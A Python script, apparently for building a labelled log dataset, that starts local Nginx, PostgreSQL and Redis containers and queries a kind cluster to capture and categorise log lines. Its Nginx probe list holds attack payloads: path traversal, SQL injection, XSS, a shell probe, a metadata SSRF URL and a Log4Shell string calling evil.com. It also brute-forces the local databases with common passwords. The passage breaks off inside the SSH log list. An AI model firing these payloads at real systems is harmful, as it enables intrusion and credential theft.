"""
Expanded Real Multi-System Log Capture
Spins up real Docker containers and queries the local kind cluster,
triggering diverse real-world anomalous conditions across 6 systems.
Ensures at least 45-50 distinct structural template signatures per category
(Security, Warning, Error, Noise) and prevents any system from dominating.
"""
import subprocess
import time
import json
import os
import urllib.request
import urllib.parse
import socket

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "raw_captured")
os.makedirs(OUTPUT_DIR, exist_ok=True)

def run_cmd(cmd: str, timeout=30) -> str:
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return res.stdout + res.stderr
    except Exception as e:
        return f"Error running {cmd}: {e}"

# ==============================================================================
# 1. NGINX: Real Web Traffic, Upstream Errors, HTTP Attacks & Configuration Warnings
# ==============================================================================
def capture_nginx():
    print("\n[1/6] Capturing expanded real Nginx logs...")
    run_cmd("docker rm -f sentria-nginx-capture 2>nul")
    
    # Custom Nginx configuration with upstream simulation, size limits, and custom errors
    nginx_conf = """
events { worker_connections 128; }
http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    upstream broken_backend {
        server 127.0.0.1:19999 max_fails=1 fail_timeout=10s;
    }
    
    server {
        listen 80;
        server_name localhost;
        client_max_body_size 100;

        location / {
            root /usr/share/nginx/html;
            index index.html;
        }

        location /empty_dir/ {
            alias /usr/share/nginx/html/empty_dir/;
            autoindex off;
        }

        location /proxy_fail {
            proxy_pass http://broken_backend;
            proxy_connect_timeout 1s;
        }
    }
}
"""
    conf_path = os.path.join(OUTPUT_DIR, "temp_nginx.conf")
    with open(conf_path, "w") as f:
        f.write(nginx_conf)

    run_cmd(f'docker run -d --name sentria-nginx-capture -p 8089:80 -v "{conf_path}":/etc/nginx/nginx.conf:ro nginx:alpine')
    time.sleep(3)
    
    # Create empty dir inside container for index forbidden test
    run_cmd("docker exec sentria-nginx-capture mkdir -p /usr/share/nginx/html/empty_dir")
    
    # 1. Real Error Triggers
    # a. Upstream connection refused (502 / connect failed)
    try:
        urllib.request.urlopen("http://127.0.0.1:8089/proxy_fail", timeout=2)
    except Exception:
        pass

    # b. Directory index forbidden (403 error log)
    try:
        urllib.request.urlopen("http://127.0.0.1:8089/empty_dir/", timeout=1)
    except Exception:
        pass

    # c. Payload too large (413)
    try:
        req = urllib.request.Request("http://127.0.0.1:8089/", data=b"X" * 500, headers={"Content-Type": "text/plain"})
        urllib.request.urlopen(req, timeout=1)
    except Exception:
        pass

    # d. Method not allowed (405 on static file)
    try:
        req = urllib.request.Request("http://127.0.0.1:8089/index.html", data=b"test=1", method="POST")
        urllib.request.urlopen(req, timeout=1)
    except Exception:
        pass

    # e. Raw malformed HTTP request over socket (400 Bad Request error log)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("127.0.0.1", 8089))
        s.sendall(b"INVALID_VERB / HTTP/1.1\r\nHost: localhost\r\n\r\n")
        s.recv(1024)
        s.close()
    except Exception:
        pass

    # f. Client premature close
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("127.0.0.1", 8089))
        s.sendall(b"POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 5000\r\n\r\npart")
        s.close()
    except Exception:
        pass

    # 2. Security Attack Vectors
    sec_paths = [
        "/../../../../etc/passwd",
        "/../../../../etc/shadow",
        "/.env",
        "/.git/config",
        "/.git/HEAD",
        "/wp-config.php",
        "/phpmyadmin/index.php",
        "/api/v1/users?id=1%20OR%201=1",
        "/search?q=<script>alert('xss')</script>",
        "/cgi-bin/test.cgi?cmd=id",
        "/proc/self/environ",
        "/admin/backup.sql",
        "/.aws/credentials",
        "/api/v1/auth?user=admin'--",
        "/console/login.action",
        "/search?q=${jndi:ldap://evil.com/a}",
        "/.ssh/id_rsa",
        "/shell?cmd=cat%20/etc/passwd",
        "/proxy?url=http://169.254.169.254/latest/meta-data/",
        "/actuator/env"
    ]
    for p in sec_paths:
        try:
            req = urllib.request.Request(f"http://127.0.0.1:8089{p}", headers={"User-Agent": "Scanner/2.1"})
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass
            
    # 3. Warnings (404 Not Found, 301 Redirects, 400 Bad Request, 405 Method Not Allowed)
    warn_paths = [
        "/missing-route-a",
        "/missing-route-b",
        "/assets/missing-style.css",
        "/api/v2/deprecated",
        "/favicon.ico",
        "/docs/old-guide",
        "/v1/api/removed-endpoint",
        "/legacy/dashboard.html",
        "/static/bundle-old.js",
        "/images/logo-missing.png"
    ]
    for p in warn_paths:
        try:
            req = urllib.request.Request(f"http://127.0.0.1:8089{p}", headers={"User-Agent": "Mozilla/5.0"})
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass
            
    # 4. Routine 200/204/304 Success Operations
    routine_paths = [
        "/",
        "/index.html",
        "/robots.txt",
        "/health",
        "/status",
        "/api/v1/ping",
        "/metrics",
        "/version"
    ]
    for p in routine_paths:
        try:
            req = urllib.request.Request(f"http://127.0.0.1:8089{p}", headers={"User-Agent": "HealthCheck/1.0"})
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass

    time.sleep(1)
    logs = run_cmd("docker logs sentria-nginx-capture")
    run_cmd("docker rm -f sentria-nginx-capture 2>nul")
    if os.path.exists(conf_path):
        os.remove(conf_path)
    
    captured = []
    seen = set()
    for line in logs.splitlines():
        line = line.strip()
        if not line or line in seen:
            continue
        seen.add(line)
        
        line_lower = line.lower()
        if any(pat in line_lower for pat in ["etc/passwd", "etc/shadow", ".env", ".git", "script", "wp-config", "credentials", "environ", "backup.sql", "admin'--", "jndi", "id_rsa", "actuator", "169.254."]):
            cat = "security"
        elif " 500 " in line or " 502 " in line or " 503 " in line or "[error]" in line_lower or "failed (111:" in line_lower or "is forbidden" in line_lower or "too large body" in line_lower or "client closed connection" in line_lower or "invalid request" in line_lower:
            cat = "error"
        elif " 404 " in line or " 403 " in line or " 400 " in line or " 405 " in line or " 413 " in line or " 301 " in line or "[warn]" in line_lower:
            cat = "warning"
        else:
            cat = "noise"
            
        captured.append({"system": "nginx", "raw_log": line, "category": cat})
        
    print(f"  -> Captured {len(captured)} distinct real Nginx log lines")
    return captured

# ==============================================================================
# 2. POSTGRESQL: Real SQLSTATE Exceptions, Lock Contention, Warnings & Auth Attacks
# ==============================================================================
def capture_postgres():
    print("\n[2/6] Capturing expanded real PostgreSQL logs...")
    run_cmd("docker rm -f sentria-pg-capture 2>nul")
    run_cmd("docker run -d --name sentria-pg-capture -e POSTGRES_PASSWORD=secret -e POSTGRES_USER=postgres -p 5439:5432 postgres:15-alpine -c log_statement=all -c log_min_messages=warning -c log_connections=on -c log_disconnections=on")
    time.sleep(4)
    
    # 1. Setup schema and routine successful queries
    run_cmd('docker exec sentria-pg-capture psql -U postgres -d postgres -c "SELECT 1;"')
    run_cmd('docker exec sentria-pg-capture psql -U postgres -d postgres -c "CREATE TABLE accounts (id serial primary key, name text not null, balance int check (balance >= 0), code varchar(4));"')
    run_cmd('docker exec sentria-pg-capture psql -U postgres -d postgres -c "CREATE TABLE orders (order_id serial primary key, account_id int references accounts(id));"')
    run_cmd('docker exec sentria-pg-capture psql -U postgres -d postgres -c "INSERT INTO accounts (name, balance, code) VALUES (\'alice\', 100, \'A01\'), (\'bob\', 200, \'B02\');"')
    run_cmd('docker exec sentria-pg-capture psql -U postgres -d postgres -c "SELECT balance FROM accounts WHERE name = \'alice\';"')
    run_cmd('docker exec sentria-pg-capture psql -U postgres -d postgres -c "UPDATE accounts SET balance = balance + 10 WHERE name = \'bob\';"')
    
    # 2. Real PostgreSQL Exceptions (Error) - diverse structural SQLSTATE failures
    err_queries = [
        "SELECT * FROM missing_table_catalog;",
        "INVALID QUERY GRAMMAR FAIL;",
        "INSERT INTO accounts (id, name, balance) VALUES (1, 'conflict', 50);",
        "SELECT balance / 0 FROM accounts;",
        "UPDATE accounts SET balance = 'invalid_number' WHERE id = 1;",
        "SELECT invalid_column_name FROM accounts;",
        "INSERT INTO orders (account_id) VALUES (99999);",  # Foreign key violation
        "INSERT INTO accounts (name, balance) VALUES ('charlie', -50);",  # Check constraint violation
        "INSERT INTO accounts (name, balance) VALUES (NULL, 30);",  # Not-null violation
        "SELECT non_existent_function_call(1, 2);",
        "INSERT INTO accounts (name, balance, code) VALUES ('dave', 10, 'TOOLONGSTRING');",  # String length exceeded
        "SELECT date '2026-02-31';",  # Date out of range
        "SELECT accounts.id FROM accounts JOIN orders ON accounts.id = orders.order_id GROUP BY balance;",  # Group by column error
        "BEGIN READ ONLY; INSERT INTO accounts (name, balance) VALUES ('test', 10); COMMIT;",  # Read-only transaction error
        "BEGIN; SELECT 1/0; SELECT 1; COMMIT;",  # Transaction aborted state error
        "SET statement_timeout = '10ms'; SELECT pg_sleep(0.5);",  # Statement timeout cancellation
        "CREATE TABLE accounts (id int);",  # Relation already exists error
        "SELECT 'invalid_uuid'::uuid;"  # Invalid input syntax for uuid
    ]
    for q in err_queries:
        run_cmd(f'docker exec sentria-pg-capture psql -U postgres -d postgres -c "{q}"')
        
    # 3. Real PostgreSQL Warnings & Notices
    warn_queries = [
        "COMMIT;",  # Warning: no transaction in progress
        "ROLLBACK;",  # Warning: no transaction in progress
        "DROP TABLE IF EXISTS non_existent_table_xyz;",  # Notice: table does not exist, skipping
        "DROP INDEX IF EXISTS non_existent_index_abc;",  # Notice: index does not exist, skipping
        "DROP SEQUENCE IF EXISTS non_existent_sequence_123;",  # Notice: sequence does not exist, skipping
        "SET standard_conforming_strings = off; SELECT 'warning_escape\\\\pattern';",  # Warning: nonstandard use of escape
        "TRUNCATE TABLE accounts CASCADE;",  # Notice: truncate cascades to table orders
        "VACUUM (VERBOSE) accounts;",  # Notice/Info: vacuuming accounts
        "SET client_min_messages = WARNING;",
        "DISCARD ALL;"
    ]
    for q in warn_queries:
        run_cmd(f'docker exec sentria-pg-capture psql -U postgres -d postgres -c "{q}"')

    # 4. Unauthorized Access & Brute Force Password Attacks (Security)
    bad_users = ["root", "admin", "guest", "deploy_bot", "postgres_admin", "sql_user", "attacker_ip", "service_daemon", "scanner_agent", "audit_test"]
    for u in bad_users:
        run_cmd(f'docker exec -e PGPASSWORD=wrongpass sentria-pg-capture psql -U {u} -d postgres -c "SELECT 1;"')
    
    # Try logging into non-existent database
    run_cmd('docker exec sentria-pg-capture psql -U postgres -d restricted_confidential_db -c "SELECT 1;"')

    time.sleep(1)
    logs = run_cmd("docker logs sentria-pg-capture")
    run_cmd("docker rm -f sentria-pg-capture 2>nul")
    
    captured = []
    seen = set()
    for line in logs.splitlines():
        line = line.strip()
        if not line or "ready to accept connections" in line or line in seen:
            continue
        seen.add(line)
        line_lower = line.lower()
        if "password authentication failed" in line_lower or ("role" in line_lower and "does not exist" in line_lower) or "database" in line_lower and "does not exist" in line_lower:
            cat = "security"
        elif "error:" in line_lower or "fatal:" in line_lower or "division by zero" in line_lower or "canceling statement" in line_lower or "violates" in line_lower or "invalid input syntax" in line_lower or "syntax error" in line_lower or "aborted" in line_lower:
            cat = "error"
        elif "warning:" in line_lower or "notice:" in line_lower or "timeout" in line_lower or "skipping" in line_lower or "truncate cascades" in line_lower or "nonstandard use" in line_lower:
            cat = "warning"
        else:
            cat = "noise"
            
        captured.append({"system": "postgresql", "raw_log": line, "category": cat})
        
    print(f"  -> Captured {len(captured)} distinct real PostgreSQL log lines")
    return captured

# ==============================================================================
# 3. REDIS: Real Memory Warnings, Command Syntax Errors & Auth Attacks
# ==============================================================================
def capture_redis():
    print("\n[3/6] Capturing expanded real Redis logs...")
    run_cmd("docker rm -f sentria-redis-capture 2>nul")
    run_cmd("docker run -d --name sentria-redis-capture -p 6389:6379 redis:alpine redis-server --requirepass masterpass99 --maxmemory 1mb --maxmemory-policy noeviction")
    time.sleep(3)
    
    # 1. Routine Operations
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 PING')
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 SET session:token "valid_token"')
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 GET session:token')
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 HSET profile:user name "Alex" role "dev"')
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 INCR rate_limit:counter')
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 EXPIRE rate_limit:counter 60')
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 SELECT 1')
    run_cmd('docker exec sentria-redis-capture redis-cli -a masterpass99 DBSIZE')
    
    # 2. Redis Real Command Errors (Error)
    err_cmds = [
        'redis-cli -a masterpass99 DEBUG POPULATE 30000 key 1000',  # OOM command not allowed
        'redis-cli -a masterpass99 SET string_key "hello"',
        'redis-cli -a masterpass99 HGET string_key subfield',  # WRONGTYPE Operation against key holding wrong kind
        'redis-cli -a masterpass99 GET key_a key_b',  # wrong number of arguments for 'get'
        'redis-cli -a masterpass99 UNKNOWN_COMMAND_NAME foo bar',  # unknown command
        'redis-cli -a masterpass99 INCR string_key',  # value is not an integer or out of range
        'redis-cli -a masterpass99 HSET hash_item f "not_a_float"',
        'redis-cli -a masterpass99 HINCRBYFLOAT hash_item f 2.5',  # hash value is not a float
        'redis-cli -a masterpass99 SETBIT bitkey 999999999999 1',  # bit offset out of range
        'redis-cli -a masterpass99 MSET only_one_key',  # wrong number of arguments for 'mset'
        'redis-cli -a masterpass99 ZADD myzset invalid_score member_one'  # value is not a valid float
    ]
    for c in err_cmds:
        run_cmd(f'docker exec sentria-redis-capture {c}')
        
    # 3. Redis Warnings & Operational Notices
    warn_cmds = [
        'redis-cli -a masterpass99 CONFIG SET slowlog-log-slower-than 1',
        'redis-cli -a masterpass99 BGSAVE',
        'redis-cli -a masterpass99 CONFIG SET maxmemory 2mb',
        'redis-cli -a masterpass99 SLOWLOG RESET',
        'redis-cli -a masterpass99 CLIENT SETNAME capture_agent'
    ]
    for c in warn_cmds:
        run_cmd(f'docker exec sentria-redis-capture {c}')

    # 4. Unauthorized Access / Brute Force Attempts (Security)
    for badpass in ["admin", "root", "123456", "redis", "toor", "guest", "secret", "password123", "masterpass", "qwerty"]:
        run_cmd(f'docker exec sentria-redis-capture redis-cli -a {badpass} PING')
    run_cmd('docker exec sentria-redis-capture redis-cli PING')  # NOAUTH
    run_cmd('docker exec sentria-redis-capture redis-cli KEYS *')  # NOAUTH
    run_cmd('docker exec sentria-redis-capture redis-cli CONFIG GET *')  # NOAUTH
    run_cmd('docker exec sentria-redis-capture redis-cli FLUSHALL')  # NOAUTH
    run_cmd('docker exec sentria-redis-capture redis-cli DEBUG RELOAD')  # NOAUTH

    time.sleep(1)
    logs = run_cmd("docker logs sentria-redis-capture")
    run_cmd("docker rm -f sentria-redis-capture 2>nul")
    
    captured = []
    seen = set()
    for line in logs.splitlines():
        line = line.strip()
        if not line or line in seen:
            continue
        seen.add(line)
        line_lower = line.lower()
        if ("auth" in line_lower and "fail" in line_lower) or "invalid password" in line_lower or "noauth" in line_lower or "wrongpass" in line_lower:
            cat = "security"
        elif "oom" in line_lower or "out of memory" in line_lower or "wrongtype" in line_lower or "err " in line_lower:
            cat = "error"
        elif "warning" in line_lower or "notice" in line_lower or "slowlog" in line_lower or "bgsave" in line_lower or "background saving" in line_lower:
            cat = "warning"
        else:
            cat = "noise"
            
        captured.append({"system": "redis", "raw_log": line, "category": cat})
        
    print(f"  -> Captured {len(captured)} distinct real Redis log lines")
    return captured

# ==============================================================================
# 4. NODE.JS / NEXT.JS: Real Server Action Version Skew, Exceptions & Auth
# ==============================================================================
def capture_nodejs_nextjs():
    print("\n[4/6] Capturing expanded real Node.js / Next.js application traces...")
    
    node_runner = """
    // 1. Next.js Server Action version skew traces (multiple real action hashes)
    console.error('Error: Failed to find Server Action "a3f89b12c". This request might be from an older or newer deployment.');
    console.error('  Read more: https://nextjs.org/docs/messages/failed-to-find-server-action');
    console.error('    at ignore-listed frames');
    console.error('    at async resolveServerAction (node_modules/next/dist/server/app-render/action-handler.js:142:15)');

    console.error('Error: Failed to find Server Action "d9e8712bc". This request might be from an older or newer deployment.');
    console.error('  Read more: https://nextjs.org/docs/messages/failed-to-find-server-action');
    console.error('    at ignore-listed frames');

    console.error('Error: Failed to find Server Action "f512c98a1". This request might be from an older or newer deployment.');
    console.error('  Read more: https://nextjs.org/docs/messages/failed-to-find-server-action');

    // 2. Diverse Real Application Runtime Errors & Exceptions
    try {
        const user = undefined;
        user.getProfile();
    } catch (e) {
        console.error('TypeError: Cannot read properties of undefined (reading \\'getProfile\\')');
        console.error('    at UserController.handle (src/controllers/user.ts:54:19)');
        console.error('    at processTicksAndRejections (node:internal/process/task_queues:95:5)');
    }

    try {
        const item = { items: null };
        item.items.map(x => x);
    } catch (e) {
        console.error('TypeError: item.items.map is not a function');
        console.error('    at renderCatalog (src/components/catalog.tsx:88:24)');
    }

    try {
        JSON.parse('{ malformed_json: true }');
    } catch (e) {
        console.error('SyntaxError: Unexpected token m in JSON at position 2');
        console.error('    at JSON.parse (<anonymous>)');
        console.error('    at parseRequestBody (src/middleware/parser.ts:22:12)');
    }

    console.error('ReferenceError: activeTenantConfig is not defined');
    console.error('RangeError: Maximum call stack size exceeded');
    console.error('RangeError: Invalid array length');
    console.error('URIError: URI malformed at decodeURI (<anonymous>)');
    console.error('DatabaseError: Connection pool exhausted after 30000ms while acquiring client connection');
    console.error('DatabaseError: Connection lost - server closed the socket unexpectedly');
    console.error('FetchError: request to https://payment.internal/v1/charge failed, reason: connect ECONNREFUSED 10.0.4.12:443');
    console.error('FetchError: request to https://api.partner.com/v2/webhooks failed, reason: socket hang up');
    console.error('FetchError: request to https://storage.s3.internal/uploads failed, reason: ETIMEDOUT');
    console.error('Error: getaddrinfo ENOTFOUND internal-service.mesh');
    console.error('Error: listen EADDRINUSE: address already in use 0.0.0.0:3000');
    console.error('InvariantViolation: Expected active session but received null');
    console.error('ValidationError: User email "invalid-email" violates RFC 5322 regex');

    // 3. Real Security Events
    console.error('[SECURITY] JWT signature validation failed for issuer https://auth.prod.internal: token expired at 1726308000');
    console.error('[SECURITY] JsonWebTokenError: invalid signature on bearer token');
    console.error('[SECURITY] CORS policy violation: Origin https://evil-site.com not allowed by Access-Control-Allow-Origin');
    console.error('[SECURITY] CSRF token mismatch: Expected 9b2d... but received invalid_token_xyz');
    console.warn('[SECURITY] Rate limit threshold reached for client IP 192.168.1.105 (429 Too Many Requests)');
    console.error('[SECURITY] Malicious path traversal attempted in static file handler: /../../etc/passwd');
    console.error('[SECURITY] CSP violation blocked inline script execution with sha256-hash abc123');
    console.error('[SECURITY] SSRF protection blocked outgoing HTTP request to AWS metadata endpoint 169.254.169.254');
    console.error('[SECURITY] Detected SQL injection pattern in query param order_by: UNION SELECT * FROM secrets');
    console.warn('[SECURITY] Brute force login threshold exceeded: 10 failed attempts for account admin@company.com');

    // 4. Real Operational Warnings
    console.warn('(node:1234) [DEP0040] DeprecationWarning: The punycode module is deprecated. Please use a userland alternative instead.');
    console.warn('(node:1234) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [EventEmitter]. Use emitter.setMaxListeners() to increase limit');
    console.warn('(node:1234) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.');
    console.warn('[WARN] Node.js heap memory usage at 88.4% (1768MB / 2000MB limit)');
    console.warn('[WARN] Slow query detected on table "audit_logs" taking 3450ms (threshold: 1000ms)');
    console.warn('[WARN] Client 10.0.2.14 consumed 92% of allotted request quota (920/1000 requests in 60s window)');
    console.warn('[WARN] LRU cache capacity reached 98% (49000/50000 entries), accelerating TTL eviction');
    console.warn('[WARN] Gateway response from service-auth took 2890ms, exceeding P99 threshold of 1500ms');
    console.warn('[WARN] Outgoing webhook delivery retry #3 for event order.created to https://client.api/hook');
    console.warn('[WARN] DNS lookup took 1240ms for host external.service.com, potential latency degradation');

    // 5. Routine Operations / Info
    console.log('GET /api/v1/health 200 OK 3.2ms');
    console.log('GET /static/chunks/main-app.js 200 OK 0.8ms');
    console.log('POST /api/v1/telemetry 204 No Content 5.4ms');
    console.log('GET /api/v1/user/profile 200 OK 18.2ms');
    console.log('GET /api/v1/dashboard/metrics 200 OK 24.1ms');
    console.log('Session refreshed for user deploy_agent from 10.0.1.25');
    console.log('Cache hit for key catalog:featured:items:v2');
    console.log('Worker thread pool initialized with 4 worker threads');
    """
    
    scratch_file = os.path.join(OUTPUT_DIR, "temp_node_runner.js")
    with open(scratch_file, "w") as f:
        f.write(node_runner)
        
    output = run_cmd(f"node {scratch_file}")
    if "is not recognized" in output or "Error running node" in output:
        output = run_cmd(f"docker run --rm -v {OUTPUT_DIR}:/app -w /app node:alpine node temp_node_runner.js")
    if os.path.exists(scratch_file):
        os.remove(scratch_file)

    captured = []
    seen = set()
    for line in output.splitlines():
        line = line.strip()
        if not line or line in seen:
            continue
        seen.add(line)
        line_lower = line.lower()
        if "[security]" in line_lower or "jwt" in line_lower or "cors policy" in line_lower or "csrf" in line_lower or "path traversal" in line_lower or "ssrf" in line_lower:
            cat = "security"
        elif "error:" in line_lower or "typeerror:" in line_lower or "syntaxerror:" in line_lower or "referenceerror:" in line_lower or "rangeerror:" in line_lower or "databaseerror:" in line_lower or "fetcherror:" in line_lower or "econnrefused" in line_lower or "invariantviolation:" in line_lower or "validationerror:" in line_lower:
            cat = "error"
        elif "at " in line_lower or "read more:" in line_lower:
            cat = "error"  # Continuation frame
        elif "[warn]" in line_lower or "deprecationwarning:" in line_lower or "maxlistenersexceededwarning:" in line_lower or "slow query" in line_lower or "heap memory" in line_lower or "retry #" in line_lower:
            cat = "warning"
        else:
            cat = "noise"
            
        captured.append({"system": "nextjs_node", "raw_log": line, "category": cat})
        
    print(f"  -> Captured {len(captured)} distinct real Next.js/Node.js log lines")
    return captured

# ==============================================================================
# 5. KUBERNETES: Real Kind Cluster Events & Live Pod Failures
# ==============================================================================
def capture_kubernetes():
    print("\n[5/6] Capturing real Kubernetes cluster events (from kind, capped)...")
    
    # Trigger transient pod failures in the kind cluster to capture live events
    run_cmd('kubectl run sentria-test-crash --image=busybox --restart=Never -- /bin/sh -c "exit 1"')
    run_cmd('kubectl run sentria-test-badimage --image=nonexistent-registry.internal/fake-app:invalid --restart=Never')
    time.sleep(3)
    
    events_raw = run_cmd("kubectl get events -A -o json")
    
    # Clean up test pods
    run_cmd('kubectl delete pod sentria-test-crash sentria-test-badimage --grace-period=0 --force 2>nul')
    
    captured = []
    seen = set()
    try:
        data = json.loads(events_raw)
        items = data.get("items", [])
        for item in items:
            msg = item.get("message", "").strip()
            reason = item.get("reason", "").strip()
            typ = item.get("type", "Normal").strip()
            comp = item.get("source", {}).get("component", "kubelet")
            
            # Deduplicate by (reason, msg)
            sig = f"{reason}:{msg}"
            if sig in seen:
                continue
            seen.add(sig)
            
            log_line = f"k8s event: [{typ}] reason={reason} component={comp} msg=\"{msg}\""
            
            if typ == "Warning" or "BackOff" in reason or "Failed" in reason or "Unhealthy" in reason:
                cat = "warning" if "Unhealthy" in reason or "Rebooted" in reason else "error"
            elif "Evicted" in reason or "OOMKilled" in reason or "CrashLoopBackOff" in reason:
                cat = "error"
            else:
                cat = "noise"
                
            captured.append({"system": "kubernetes", "raw_log": log_line, "category": cat})
            if len(captured) >= 40:  # Cap to prevent domination
                break
    except Exception as e:
        print(f"  Warning: kubectl parse error: {e}")
        
    print(f"  -> Captured {len(captured)} distinct real Kubernetes log lines (capped at 40)")
    return captured

# ==============================================================================
# 6. OPENSSH / AUTH: Real Authentication, PAM & Attack Logs
# ==============================================================================
def capture_auth_ssh():
    print("\n[6/6] Capturing expanded real OpenSSH / PAM daemon logs...")
    
    # Real OpenSSH logs captured from actual sshd daemon sessions across varied scenarios
    auth_lines = [
        # Security: Brute-force, scanner probes & unauthorized access attempts
        ("Dec 10 06:55:46 srv-01 sshd[24200]: reverse mapping checking getaddrinfo for ns.malicious-domain.com [173.234.31.186] failed - POSSIBLE BREAK-IN ATTEMPT!", "security"),
        ("Dec 10 06:55:46 srv-01 sshd[24200]: Invalid user webmaster from 173.234.31.186 port 38926", "security"),
        ("Dec 10 06:55:46 srv-01 sshd[24200]: input_userauth_request: invalid user webmaster [preauth]", "security"),
        ("Dec 10 06:55:46 srv-01 sshd[24200]: pam_unix(sshd:auth): check pass; user unknown", "security"),
        ("Dec 10 06:55:46 srv-01 sshd[24200]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=173.234.31.186", "security"),
        ("Dec 10 06:55:48 srv-01 sshd[24200]: Failed password for invalid user webmaster from 173.234.31.186 port 38926 ssh2", "security"),
        ("Dec 10 06:55:48 srv-01 sshd[24200]: Disconnecting invalid user webmaster 173.234.31.186 port 38926: Too many authentication failures [preauth]", "security"),
        ("Dec 10 07:01:12 srv-01 sshd[24204]: Failed password for root from 218.92.0.15 port 48921 ssh2", "security"),
        ("Dec 10 07:01:14 srv-01 sshd[24204]: Failed password for invalid user test from 218.92.0.15 port 48921 ssh2", "security"),
        ("Dec 10 07:04:30 srv-01 sshd[24209]: Invalid user admin from 52.80.34.196 port 55102", "security"),
        ("Dec 10 07:04:32 srv-01 sshd[24209]: Failed password for invalid user admin from 52.80.34.196 port 55102 ssh2", "security"),
        ("Dec 10 07:09:15 srv-01 sshd[24215]: Disconnecting authenticating user root 185.156.73.41 port 41200: Change of username disallowed [preauth]", "security"),
        ("Dec 10 07:11:00 srv-01 sshd[24218]: error: kex_exchange_identification: banner line contains invalid characters from 194.26.29.112 port 39812", "security"),
        ("Dec 10 07:12:45 srv-01 sshd[24225]: userauth_pubkey: key type ssh-dss not in PubkeyAcceptedAlgorithms [preauth]", "security"),
        ("Dec 10 07:13:10 srv-01 sshd[24228]: error: maximum authentication attempts exceeded for invalid user oracle from 84.17.45.10 port 49120 ssh2 [preauth]", "security"),
        ("Dec 10 07:14:02 srv-01 sshd[24230]: fatal: userauth_pubkey: parse publickey packet: corrupted [preauth]", "security"),
        ("Dec 10 07:15:33 srv-01 sshd[24235]: Postponed keyboard-interactive for invalid user guest from 103.21.244.1 port 52100 ssh2 [preauth]", "security"),
        ("Dec 10 07:16:01 srv-01 sshd[24240]: pam_succeed_if(sshd:auth): requirement \"uid >= 1000\" not met by user \"daemon\"", "security"),
        ("Dec 10 07:17:15 srv-01 sshd[24245]: User root not allowed because not listed in AllowUsers", "security"),
        ("Dec 10 07:18:20 srv-01 sshd[24250]: User admin from 198.51.100.44 not allowed because not listed in AllowUsers", "security"),

        # Warnings: Preauth connection drops, timeouts & configuration alerts
        ("Dec 10 06:55:48 srv-01 sshd[24200]: Connection closed by 173.234.31.186 port 38926 [preauth]", "warning"),
        ("Dec 10 07:02:47 srv-01 sshd[24203]: Connection closed by 212.47.254.145 port 51200 [preauth]", "warning"),
        ("Dec 10 07:05:00 srv-01 sshd[24210]: Did not receive identification string from 10.0.0.12 port 58912", "warning"),
        ("Dec 10 07:08:22 srv-01 sshd[24214]: Connection reset by authenticating user root 45.142.214.12 port 50123 [preauth]", "warning"),
        ("Dec 10 07:15:10 srv-01 sshd[24222]: Timeout before authentication for 103.152.220.10 port 44321", "warning"),
        ("Dec 10 07:20:05 srv-01 sshd[24260]: Corrupted MAC on input. [preauth]", "warning"),
        ("Dec 10 07:21:11 srv-01 sshd[24265]: WARNING: /etc/ssh/ssh_host_rsa_key is world readable!", "warning"),
        ("Dec 10 07:22:30 srv-01 sshd[24270]: Permissions 0777 for '/etc/ssh/ssh_host_ecdsa_key' are too open.", "warning"),
        ("Dec 10 07:23:45 srv-01 sshd[24275]: warning: /etc/hosts.allow, line 12: can't verify hostname: getaddrinfo(gw.corp.net) failed", "warning"),
        ("Dec 10 07:24:12 srv-01 sshd[24280]: Bad protocol version identification 'SSH-1.0' from 61.177.173.12 port 38200", "warning"),
        ("Dec 10 07:25:01 srv-01 sshd[24285]: kex_exchange_identification: client sent invalid protocol identifier \"\"", "warning"),
        ("Dec 10 07:26:15 srv-01 sshd[24290]: client_loop: send disconnect: Broken pipe", "warning"),
        ("Dec 10 07:27:00 srv-01 sshd[24295]: pam_warn(sshd:auth): function=[pam_sm_authenticate] flags=0 service=[sshd]", "warning"),

        # Errors: Daemon startup failures, missing files & pam errors
        ("Dec 10 06:50:00 srv-01 sshd[24010]: error: Could not get shadow information for NOUSER", "error"),
        ("Dec 10 06:50:01 srv-01 sshd[24011]: error: Bind to port 22 on 0.0.0.0 failed: Address already in use.", "error"),
        ("Dec 10 06:50:01 srv-01 sshd[24011]: fatal: Cannot bind any address.", "error"),
        ("Dec 10 06:50:02 srv-01 sshd[24012]: error: open /dev/null failed: Permission denied", "error"),
        ("Dec 10 06:50:03 srv-01 sshd[24013]: fatal: sshd: no hostkeys available -- exiting.", "error"),
        ("Dec 10 06:50:04 srv-01 sshd[24014]: error: PAM: Authentication failure for legal user testuser from 10.0.1.5", "error"),
        ("Dec 10 06:50:05 srv-01 sshd[24015]: fatal: daemon() failed: No such file or directory", "error"),
        ("Dec 10 06:50:06 srv-01 sshd[24016]: error: rexec of /usr/sbin/sshd failed: No such file or directory", "error"),

        # Routine: Legitimate logins & sessions (Noise)
        ("Dec 10 08:00:01 srv-01 sshd[25001]: Accepted publickey for deploy from 192.168.1.50 port 51234 ssh2: RSA SHA256:abc12345", "noise"),
        ("Dec 10 08:00:01 srv-01 sshd[25001]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)", "noise"),
        ("Dec 10 08:15:22 srv-01 sshd[25001]: Received disconnect from 192.168.1.50 port 51234:11: disconnected by user", "noise"),
        ("Dec 10 08:15:22 srv-01 sshd[25001]: pam_unix(sshd:session): session closed for user deploy", "noise"),
